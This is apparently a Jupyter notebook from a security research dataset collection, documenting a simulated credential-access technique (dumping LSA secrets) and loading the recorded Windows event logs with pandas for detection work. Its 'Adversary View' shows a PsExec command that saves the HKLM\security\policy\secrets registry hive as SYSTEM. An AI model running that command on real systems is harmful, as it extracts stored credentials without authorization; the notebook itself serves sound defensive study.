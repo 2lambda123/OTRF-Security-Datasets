{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "0cf9e9e8",
   "metadata": {},
   "source": [
    "# Psexec Reg LSA Secrets Dump"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3f43c036",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0675e6d3",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2020/10/19 |\n",
    "| Modification Date | 2020/10/19 |\n",
    "| Tactics           | [TA0006](https://attack.mitre.org/tactics/TA0006) |\n",
    "| Techniques        | [T1003.004](https://attack.mitre.org/techniques/T1003/004) |\n",
    "| Tags              | art.55295ab0-a703-433b-9ca4-ae13807de12f |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "54c3f1e1",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries using psexec to run reg.exe as system and dump LSA secrets. Location HKLM\\security\\policy\\secrets."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8dafd8de",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0de010c7",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/cmd_psexec_lsa_secrets_dump.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/cmd_psexec_lsa_secrets_dump.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "13eacb2a",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c1c9ba04",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "52cd9507",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| Manual | Cmd | [Cmd](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.004/T1003.004.md#atomic-test-1---dumping-lsa-secrets) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "49df7722",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "C:\\Users\\wardog\\Downloads\\PSTools>PsExec.exe -accepteula -s reg save HKLM\\security\\policy\\secrets %temp%\\secrets\n",
    "\n",
    "PsExec v2.2 - Execute processes remotely\n",
    "Copyright (C) 2001-2016 Mark Russinovich\n",
    "Sysinternals - www.sysinternals.com\n",
    "\n",
    "\n",
    "The operation completed successfully.\n",
    "reg exited on WORKSTATION5 with error code 0.\n",
    "\n",
    "C:\\Users\\wardog\\Downloads\\PSTools>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c21ac3c3",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "317008f2",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "70918871",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/cmd_psexec_lsa_secrets_dump.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f42a2048",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5c72ee7e",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "08a90bd3",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "072db64c",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "40bbee77",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.004/T1003.004.md#atomic-test-1---dumping-lsa-secrets](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.004/T1003.004.md#atomic-test-1---dumping-lsa-secrets) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
